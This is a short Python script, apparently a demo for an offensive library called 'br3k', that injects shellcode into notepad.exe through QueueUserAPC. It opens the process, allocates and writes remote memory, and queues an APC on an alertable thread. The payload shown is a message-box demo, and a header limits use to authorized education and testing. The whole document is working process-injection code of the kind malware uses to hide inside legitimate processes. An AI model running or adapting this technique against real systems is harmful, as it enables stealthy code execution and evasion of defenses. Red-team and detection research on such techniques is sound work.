# =============================================================================
# IMPORTANT USAGE NOTICE
# 1. Use only for authorized, non-malicious education, research, and testing.
# =============================================================================

import br3k
from br3k import ProcessOpenStrategy, ProcessVmWriteStrategy

PROCESS_NAME = "notepad.exe"

if __name__ == "__main__":

    print("Script: Inject via queue user APC")
    print()

    br3k.init_sysapi()

    shellcode = br3k.shellcode_get_messageboxw()

    process = br3k.Process(
        name=PROCESS_NAME,
        process_vm_write_strategy=ProcessVmWriteStrategy.AllocateInAddr,
        process_open_strategy=ProcessOpenStrategy.OpenProcess
    )

    process.open()
    process.init_memory()
    process.create_memory(size=len(shellcode))
    ep = process.get_memory_remote_address()
    process.write_memory(data=shellcode)

    thread = br3k.Thread(process)
    thread.open_alertable()
    thread.queue_user_apc(ep=ep)
